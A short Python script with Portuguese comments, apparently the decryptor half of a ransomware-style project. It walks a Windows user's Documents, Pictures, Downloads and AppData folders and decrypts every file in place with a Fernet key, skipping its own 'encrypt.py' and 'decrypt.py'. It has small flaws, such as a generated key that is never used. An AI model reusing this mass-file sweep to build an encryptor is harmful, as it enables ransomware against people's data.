import os
from cryptography.fernet import Fernet

#usa a chave para descriptografar
key = Fernet.generate_key()
with open("key.pem", "rb") as key_file:
    secret_key = key_file.read()

# lista os arquivos criptografados
username = os.getenv("USERNAME")
folders = [
    os.path.join(r"c:\Users", username, "Documents"),
    os.path.join(r"c:\Users", username, "Pictures"),
    os.path.join(r"c:\Users", username, "Videos"),
    os.path.join(r"c:\Users", username, "Downloads"),
    os.path.join(r"c:\Users", username, "AppData", "Local"),
    os.path.join(r"c:\Users", username, "AppData", "Roaming"),
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ["encrypt.py","decrypt.py", "key_file.key", "desktop.ini"]:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)

# descriptgrafar os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

    conteudo_descriptografado = Fernet(secret_key).decrypt(conteudo)

    with open(arquivo, "wb") as file:
        file.write(conteudo_descriptografado)